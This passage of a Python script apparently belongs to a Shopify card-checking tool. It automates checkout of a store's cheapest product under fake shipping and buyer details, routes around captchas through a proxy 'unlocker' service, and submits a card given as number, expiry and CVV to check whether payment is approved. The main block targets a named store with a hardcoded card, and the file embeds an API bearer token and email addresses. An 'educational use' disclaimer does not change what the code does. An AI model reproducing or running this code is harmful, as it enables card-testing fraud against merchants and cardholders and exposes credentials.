                result["quantity"] = int(line)
                break

        i = 0
        while i < len(lines):
            line = lines[i].lower()
            if line == "subtotal":
                if i + 1 < len(lines):
                    result["subtotal"] = self.money_to_float(lines[i + 1])
            elif line == "order discount":

                if i + 1 < len(lines):
                    next_line = lines[i + 1]
                    if not re.search(r"\$", next_line):
                        result["discount_label"] = next_line

                # search near next 3 lines for discount amount
                for j in range(i + 1, min(i + 5, len(lines))):
                    if "−" in lines[j] or "-" in lines[j]:
                        amt = self.money_to_float(lines[j])
                        if amt is not None:
                            result["discount_amount"] = amt
                            break

            # Estimated taxes
            elif line == "estimated taxes":
                for j in range(i + 1, min(i + 4, len(lines))):
                    amt = self.money_to_float(lines[j])
                    if amt is not None:
                        result["estimated_taxes"] = amt
                        break

            # Total block
            elif line.strip().lower() == "total":
                price = self.storage.get_value(
                    "cart.total_price",
                    site_url=site_url,
                    default=0
                ) or 0

                for j in range(i + 1, min(i + 5, len(lines))):
                    next_line = lines[j].strip()

                    if re.fullmatch(r"[A-Z]{3}", next_line):
                        result["currency"] = next_line
                        continue

                    amt = self.money_to_float(next_line)
                    if amt is not None:
                        result["total"] = amt
                        break
                else:
                    # fallback: search near next lines for currency and amount
                    for j in range(i + 1, min(i + 5, len(lines))):
                        if result["currency"] is None and re.fullmatch(r"[A-Z]{3}", lines[j]):
                            result["currency"] = lines[j]

                        amt = self.money_to_float(lines[j])
                        if amt is not None:
                            result["total"] = amt
                            break

                # final fallback if still not found
                if result.get("total") is None:
                    result["total"] = price  / 100

            i += 1

        # normalize missing values
        if result["estimated_taxes"] is None:
            result["estimated_taxes"] = 0
        data = storage.generate_and_save_address(
            nat="US",  # optional
            key="shipping_address",  # where it will be saved in data.json
            states_json_path="states.json",
            geonames_username="darklord"
        )

        redirect_location = self.storage.get_value(
            "redirect_location",
            site_url=site_url,
            default=""
        ) or ""
        # get saved data
        saved = storage.get_value("shipping_address") or {}
        address = saved.get("address", {})
        title = address.get("title")
        first = address.get("first_name")
        last = address.get("last_name")
        full_name = address.get("full_name")
        email = address.get("email")
        phone = address.get("phone")
        cell = address.get("cell")
        country_code = address.get("country_code")
        street_number = address.get("street_number")
        street_name = address.get("street_name")
        city = address.get("city")
        state = address.get("state")
        country = address.get("country")
        postcode = address.get("postcode")
        full_address = address.get("full_address")
        zoneCode = address.get("zone_admin_code")  # e.g. "NC"
        postalCode = str(address.get("postcode") or "")
        id = storage.get_value(
            "last_cart_add.variant_id",
            site_url=site_url
        )
        print(id)
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-LB',
            'content-type': 'application/json',
            'origin': f'{base}',
            'priority': 'u=1, i',
            'referer': f'{redirect_location}',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{tokenx}", type="cn"',
            'user-agent': f'Mozilla 5.0',
            'x-checkout-one-session-token': c,
            'x-checkout-web-build-id': str(commit_sha),
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': f'{tokenx}',
        }

        params = {
            'operationName': 'Proposal',
        }

        json_data = {
            "variables": {
                "sessionInput": {
                    "sessionToken": c,
                },
                "queueToken": tokens.get("queue_token"),

                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True,
                },

                "delivery": {
                    "deliveryLines": [
                        {
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {
                                "lines": [{"stableId": tokens.get("stable_id")}],
                            },
                            "deliveryMethodTypes": ["NONE"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }
                    ],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },

                "deliveryExpectations": {"deliveryExpectationLines": []},

                "merchandise": {
                    "merchandiseLines": [
                        {
                            "stableId":tokens.get("stable_id"),
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{id}",
                                    "variantId": f"gid://shopify/ProductVariant/{id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            # Keep if required; otherwise consider using {"any": True} if the schema supports it
                            "expectedTotalPrice": {
                                "value": {"amount": f"{result['total']}", "currencyCode": "USD"}
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }
                    ]
                },

                "memberships": {"memberships": []},

                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": f"{street_name} {street_number}",
                            "city": str(city),
                            "countryCode": str(country_code),
                            "postalCode": str(postalCode),
                            "firstName": str(first),
                            "lastName": str(last),
                            "zoneCode": str(zoneCode),
                            "phone": "+49301234567",
                        }
                    },
                },

                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": str(country_code),
                    },
                    "email": f"johnsnower@gmail.com",
                    "emailChanged": False,
                    "phoneCountryCode": str(country_code),
                    "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": str(country_code)},
                    "rememberMe": False,
                },

                "tip": {"tipLines": []},

                "note": {"message": None, "customAttributes": []},

                "localizationExtension": {"fields": []},

                "nonNegotiableTerms": None,

                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },

                "optionalDuties": {"buyerRefusesDuties": False},

                "cartMetafields": [],
            },
            "operationName": "Proposal",
            "id": "02157da1501d48d2c291fe98692433b21f5d664e35e99431349ba542327a21f0",
        }
        print(json_data)
        response = requests.post(
            f'{base}/checkouts/internal/graphql/persisted',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        print(response.text)
        try:
            response_json = response.json()
        except Exception:
            response_json = {}

        # retry only once if pending terms violation exists
        retry_done = False
        errors = (
            response_json.get("data", {})
            .get("session", {})
            .get("negotiate", {})
            .get("errors", [])
        )

        for err in errors:
            if err.get("code") == "WAITING_PENDING_TERMS":
                time.sleep(10)
                response = requests.post(
                    f'{base}/checkouts/internal/graphql/persisted',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                )
                retry_done = True
                try:
                    response_json = response.json()
                except Exception:
                    response_json = {}
                break

        negotiate = (
            response_json.get("data", {})
            .get("session", {})
            .get("negotiate", {})
        )

        proposal = negotiate.get("result", {}) or {}
        seller = proposal.get("sellerProposal", {}) or {}

        # ---------- TOTAL (LATEST VALUE) ----------
        proptotal = None

        running = seller.get("runningTotal")
        if isinstance(running, dict):
            value = running.get("value", {})
            if isinstance(value, dict):
                amount = value.get("amount")
                if amount is not None:
                    proptotal = float(amount)

        # fallback if somehow missing
        if proptotal is None:
            subtotal = seller.get("subtotalBeforeTaxesAndShipping", {})
            if isinstance(subtotal, dict):
                value = subtotal.get("value", {})
                if isinstance(value, dict):
                    amount = value.get("amount")
                    if amount is not None:
                        proptotal = float(amount)

        # ---------- TAXES ----------
        # your response has PendingTerms → taxes not ready
        proptaxes = 0.0

        # ---------- SAVE ----------
        site_url = base.rstrip("/")

        site_data = self.storage.get_site_data(site_url) or {}
        site_data["proptotal"] = proptotal
        site_data["proptaxes"] = proptaxes
        site_data["estimated_total"] = proptotal
        site_data["estimated_taxes"] = proptaxes
        site_data["proposal_retry_done"] = retry_done
        site_data["proposal_errors"] = errors
        site_data["proposal_queue_token"] = proposal.get("queueToken")

        self.storage.add_site_data(site_url, site_data)
        self.storage.add_site_data(base, {
            "session_token": c,
            "stable_id": tokens.get("stable_id"),
            "queue_token": tokens.get("queue_token"),
            "source_token": d,
            "server_render": h or "no",
            "commit_sha": commit_sha,
            "deploy_stage": deploy_stage,
            "full_headers": headers,
            "all_meta": meta_results,
            "payment_method_identifier": tokens.get("payment_method_identifier"),
            "all_tokens": tokens,
            "estimated_taxes": result['estimated_taxes'],
            "total": result['total'],
        })

    def run(self, site_url: Optional[str] = None):
        collections_data = self.get_collections(site_url=site_url)
        base_url = collections_data["base_url"]
        collection_urls = collections_data["collection_urls"]
        cheapest_product = self.find_cheapest_product(base_url, collection_urls)
        saved_data = self.save_site_summary(base_url, collections_data, cheapest_product)
        return {
            "base_url": base_url,
            "cheapest_product": cheapest_product,
            "saved_data": saved_data
        }
#############################Session####################
# Author: Wajd Dev | github.com/its-wajd
# Educational & research use only
class Session:

    def __init__(self, data, storage):
        self.data = data
        self.storage = storage

    def captcha_solver(self, site_url: Optional[str] = None):

        if not site_url:
            return None

        site_url = site_url.rstrip("/")

        # get redirect_location from data.json for this site
        checkout = self.storage.get_value(
            "redirect_location",
            site_url
        )

        headers = {
            "Authorization": "Bearer b434a152-55ad-49d2-9b6a-7a765a89d9e6",
            "Content-Type": "application/json",
        }

        json_data = {
            "zone": "web_unlocker1",
            "url": checkout,          # use the site url dynamically
            "format": "json",
            "method": "GET",
            "country": "us",
            "data_format": "markdown",
        }

        response = requests.post(
            "https://api.brightdata.com/request",
            headers=headers,
            json=json_data,
            timeout=60
        )

        try:
            return response.json()
        except Exception:
            return response.text

    def normalize_base_url(self, url: str) -> str:
        parsed = urlparse(url.strip())
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path
        if not netloc:
            raise ValueError(f"Invalid URL: {url}")
        return f"{scheme}://{netloc}"

    def submit(self,site_url: Optional[str] = None):
        base = self.normalize_base_url(site_url)
        site_url = site_url.rstrip("/")
        base = base.rstrip("/")
        card = self.data.get("card")
        cookies = self.storage.get_cookies_for_requests(site_url)

        chars = string.ascii_lowercase + string.digits
        length = 10
        attempt = ''.join(random.choice(chars) for _ in range(length))
        saved = storage.get_value("shipping_address") or {}
        address = saved.get("address", {})
        title = address.get("title")
        first = address.get("first_name")
        last = address.get("last_name")
        full_name = address.get("full_name")
        email = address.get("email")
        phone = address.get("phone")
        cell = address.get("cell")
        country_code = address.get("country_code")
        street_number = address.get("street_number")
        street_name = address.get("street_name")
        city = address.get("city")
        state = address.get("state")
        country = address.get("country")
        postcode = address.get("postcode")
        full_address = address.get("full_address")
        zoneCode = address.get("zone_admin_code")  # e.g. "NC"
        postalCode = str(address.get("postcode") or "")
        variant_id = self.storage.get_value(
            "last_cart_add.variant_id",
            site_url=site_url,
            default=0
        ) or 0

        redirect_location = self.storage.get_value(
            "redirect_location",
            site_url=site_url,
            default=""
        ) or ""

        sha = self.storage.get_value(
            "commit_sha",
            site_url=site_url,
            default=""
        ) or ""

        stable_id = self.storage.get_value(
            "stable_id",
            site_url=site_url,
            default=""
        ) or ""

        session_token = self.storage.get_value(
            "session_token",
            site_url=site_url,
            default=""
        ) or ""

        queue_token = self.storage.get_value(
            "queue_token",
            site_url=site_url,
            default=""
        ) or ""

        tokenx = self.storage.get_value(
            "tokenx",
            site_url=site_url,
            default=""
        ) or ""

        total = float(self.storage.get_value(
            "proptotal",
            site_url=site_url,
            default=0
        ) or 0)

        taxes = float(self.storage.get_value(
            "proptaxes",
            site_url=site_url,
            default=0
        ) or 0)
        paym= self.storage.get_value(
            "all_tokens.payment_method_identifier",
            site_url=site_url,
            default=0
        ) or 0
        cc, mm, yy, cvv = card.strip().split("|")
        total_amount = f"{total:.2f}"
        taxes_amount = f"{taxes:.2f}"





        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,fr;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'priority': 'u=1, i',
            'referer': 'https://checkout.pci.shopifyinc.com/build/070d608/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'shopify-identification-signature': 'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiIyMzk4MjI1IiwidW5pcXVlX2lkIjoiOWRjZThmN2M5MDg1MDJjOGVmYTJhMmY4YWQwMzM4NGQiLCJpYXQiOjE3NzEyNTcyODJ9.SpwhfwBMnRtpfoJqzw7Yt4dzJeZlHkxOHIcuy96NUb4',
            'user-agent': 'Mozilla/5.0',
        }
        print(card)
        json_data1 = {
            'credit_card': {
                'number': f'{cc}',
                'month': f'{mm}',
                'year': f'{yy}',
                'verification_value': f'{cvv}',
                'start_month': f'{mm}',
                'start_year': f'{yy}',
                'issue_number': f'{cc}',
                'name': f'miunec bold',
            },
            'payment_session_scope': f'{base}.myshopify.com',
        }

        response = requests.post('https://checkout.pci.shopifyinc.com/sessions', cookies=cookies, headers=headers,
                               json=json_data1)
        try:
            sid = (response.json()['id'])

        except Exception as e:
            print(f"Failed to get session id:{e} ")
            return
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': f'{base}',
            'priority': 'u=1, i',
            'referer': f'{redirect_location}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{tokenx}", type="cn"',
            'user-agent': 'Mozilla/5.0',
            'x-checkout-one-session-token': f'{session_token}',
            'x-checkout-web-build-id': f'{sha}',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': f'{tokenx}',
                   }
        params = {
            'operationName': 'SubmitForCompletion',
        }

        json_data = {
            'variables': {
                'input': {
                    'sessionInput': {
                        'sessionToken': f'{session_token}',
                    },
                    'queueToken': f'{queue_token}',
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {
                                            'any': True,
                                        },
                                        'shipments': {
                                            'any': True,
                                        },
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {
                                    'lines': [
                                        {
                                            'stableId': f'{stable_id}',
                                        },
                                    ],
                                },
                                'deliveryMethodTypes': [
                                    'NONE',
                                ],
                                'expectedTotalPrice': {
                                    'any': True,
                                },
                                'destinationChanged': True,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': f'{stable_id}',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [
                                            {
                                                'name': 'Personalisation',
                                                'value': {
                                                    'string': '',
                                                },
                                            },
                                        ],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{total}',
                                        'currencyCode': 'USD',
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {
                        'memberships': [],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [
                            {
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': f'{paym}',
                                        'sessionId': f'{sid}',
                                        'billingAddress': {
                                            'streetAddress': {
                                                "address1": f"{street_name} {street_number}",
                                                "city": str(city),
                                                "countryCode": str(country_code),
                                                "postalCode": str(postalCode),
                                                "firstName": str(first),
                                                "lastName": str(last),
                                                "zoneCode": str(zoneCode),
                                                "phone": "+49301234567",
                                            },
                                        },
                                        'cardSource': None,
                                    },
                                    'giftCardPaymentMethod': None,
                                    'redeemablePaymentMethod': None,
                                    'walletPaymentMethod': None,
                                    'walletsPlatformPaymentMethod': None,
                                    'localPaymentMethod': None,
                                    'paymentOnDeliveryMethod': None,
                                    'paymentOnDeliveryMethod2': None,
                                    'manualPaymentMethod': None,
                                    'customPaymentMethod': None,
                                    'offsitePaymentMethod': None,
                                    'customOnsitePaymentMethod': None,
                                    'deferredPaymentMethod': None,
                                    'customerCreditCardPaymentMethod': None,
                                    'paypalBillingAgreementPaymentMethod': None,
                                    'remotePaymentInstrument': None,
                                },
                                'amount': {
                                    'value': {
                                        'amount': f'{total}',
                                        'currencyCode': 'USD',
                                    },
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                "address1": f"{street_name} {street_number}",
                                "city": str(city),
                                "countryCode": str(country_code),
                                "postalCode": str(postalCode),
                                "firstName": str(first),
                                "lastName": str(last),
                                "zoneCode": str(zoneCode),
                                "phone": "+49301234567",
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': 'USD',
                            'countryCode': 'US',
                        },
                        'email': 'xthe.darrk.lord@gmail.com',
                        'emailChanged': False,
                        'phoneCountryCode': 'US',
                        'marketingConsent': [
                            {
                                'email': {
                                    'value': 'xthe.darrk.lord@gmail.com',
                                },
                            },
                        ],
                        'shopPayOptInPhone': {
                            'number': '',
                            'countryCode': 'US',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f'{taxes}',
                                'currencyCode': 'USD',
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                    'cartMetafields': [],
                },
                'attemptToken': f'{tokenx}-{attempt}',
                'metafields': [],
                'analytics': {
                    'requestUrl': f'{redirect_location}',
                    'pageId': '063a6d07-1986-4E9C-9714-C5322D462549',
                },
            },
            'operationName': 'SubmitForCompletion',
            'id': '7a71beed276c55492bb26de3328d24274fef8b328e1ef47b4fcee90b29de2498',
        }
        try:
            sub1 = requests.post(
                f'{base}/checkouts/internal/graphql/persisted',
                params=params,
                headers=headers,
                json=json_data,
                cookies=cookies
            )

            try:
                submit = sub1.json()
            except:
                submit = {}

            print(sub1.text)

            max_retries = 5
            attempts = 0

            while True:
                data = submit.get("data", {}).get("submitForCompletion", {})
                status = data.get("__typename")
                errors = data.get("errors", [])

                if status == "SubmitSuccess":
                    break

                pending = any(e.get("code") == "WAITING_PENDING_TERMS" for e in errors)

                if pending and attempts < max_retries:
                    time.sleep(10)
                    attempts += 1

                    sub = requests.post(
                        f'{base}/checkouts/internal/graphql/persisted',
                        params=params,
                        headers=headers,
                        json=json_data,
                        cookies=cookies
                    )

                    try:
                        submit = sub.json()
                    except:
                        submit = {}

                    continue

                break

            status = submit.get("data", {}).get("submitForCompletion", {}).get("__typename")

            if status == "SubmitSuccess":
                rid = (
                    submit.get("data", {})
                    .get("submitForCompletion", {})
                    .get("receipt", {})
                    .get("id")
                )

                if not rid:
                    return False, "missing_receipt_id"

                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-LB',
                    'content-type': 'application/json',
                    'priority': 'u=1, i',
                    'referer': f'{redirect_location}',
                    'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'shopify-checkout-client': 'checkout-web/1.0',
                    'shopify-checkout-source': f'id="{tokenx}", type="cn"',
                    'user-agent': 'Mozilla/5.0',
                    'x-checkout-one-session-token': f'{session_token}',
                    'x-checkout-web-build-id': f'{sha}',
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-server-rendering': 'yes',
                    'x-checkout-web-source-id': f'{tokenx}',
                }

                params = {
                    'operationName': 'PollForReceipt',
                    'variables': json.dumps({
                        "receiptId": rid,
                        "sessionToken": session_token
                    }),
                    'id': '2f6b14ade727374065e7c7ac82c69f85460c9c41a40b98246066f0fea41d7d7d',
                }

                poll_retries = 20

                while poll_retries > 0:
                    response = requests.get(
                        f'{base}/checkouts/internal/graphql/persisted',
                        params=params,
                        cookies=cookies,
                        headers=headers,
                    )

                    try:
                        rec = response.json()
                    except:
                        return False, "invalid_poll_response"

                    print(rec)

                    receipt_data = rec.get("data", {}).get("receipt", {})
                    typename = receipt_data.get("__typename")

                    if typename in ("ProcessingReceipt", "WaitingReceipt"):
                        time.sleep(5)
                        poll_retries -= 1
                        continue

                    elif typename == "FailedReceipt":
                        code = (
                                receipt_data.get("processingError", {}) or {}
                        ).get("code")

                        if not code:
                            code = "Rejected"

                        return False, code

                    elif typename == "ProcessedReceipt":
                        print("Approved")
                        return True, rid

                    elif typename == "ActionRequiredReceipt":
                        print("ActionRequired")
                        return False, "ActionRequiredReceipt"
                    elif typename == "FailedReceipt":
                        code = (
                            rec.get("data", {})
                            .get("receipt", {})
                            .get("processingError", {})
                            .get("code")
                        )

                        if not code:
                            code = "Rejected"

                        return False, code
                    else:
                        return False, typename or "unknown_receipt_status"

                return False, "poll_timeout"

            elif status == "SubmitRejected":
                errors = submit.get("data", {}).get("submitForCompletion", {}).get("errors", [])
                if errors:
                    return False, errors[0].get("code", "Rejected")
                return False, "Rejected"

            else:
                return False, status or "unknown_submit_status"

        except Exception as e:
            return False, str(e)
    def run(self, site_url: Optional[str] = None):
        if not site_url:
            return
        cookies = self.storage.get_cookies_for_requests(site_url)
        sub=self.submit(site_url)
        return sub
# Author: Wajd Dev | github.com/its-wajd
# Educational & research use only
if __name__ == "__main__":
         storage = Storage(user_id=12345)
         card="5488880040712510|07|2028|321"
         session = Session(
             data={"card": card},
             storage=storage
         )

         session.run("https://brizdigitals.myshopify.com/")
        # site = "https://brizdigitals.myshopify.com/"
        # storage = Storage(user_id=12345)
        # checker = Checker(user_id=12345, storage=storage)
        # print(checker.run(site))
        # print(checker.add_cart(site))
        # print(checker.get_cart(site))
        # print(checker.checkout(site))
        # checker.extract(site)
# --- End of File ---
# Developed by Wajd Dev
# github.com/its-wajd

